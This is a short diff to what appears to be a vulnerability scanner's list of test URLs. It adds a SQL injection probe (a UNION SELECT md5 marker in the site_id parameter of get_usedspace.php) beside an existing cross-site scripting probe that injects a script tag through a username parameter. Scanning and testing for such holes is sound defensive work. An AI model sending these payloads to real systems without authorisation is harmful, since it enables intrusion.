@@ -1,2 +1,3 @@
 /s/login
 /session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5({{num}}))
